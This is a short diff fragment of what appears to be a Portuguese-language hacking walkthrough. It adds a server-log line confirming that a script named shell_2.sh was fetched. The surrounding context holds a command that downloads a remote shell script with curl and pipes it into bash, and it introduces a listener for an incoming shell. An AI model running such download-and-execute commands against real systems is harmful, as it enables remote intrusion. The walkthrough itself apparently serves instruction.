@@ -34,6 +34,8 @@ curl http://[IP]:[PORTA]/shell_2.sh | bash
 
 ![image](https://github.com/user-attachments/assets/c0bba9e9-88df-4021-b2c9-9c3276935111)
 
+### Confirmação : ::ffff:192.168.100.207 - - [21/May/2025 02:49:03] "GET /shell_2.sh HTTP/1.1" 200
+
 ### 📡 Em outro terminal, deixamos o listener pronto com:
 
 ```bash
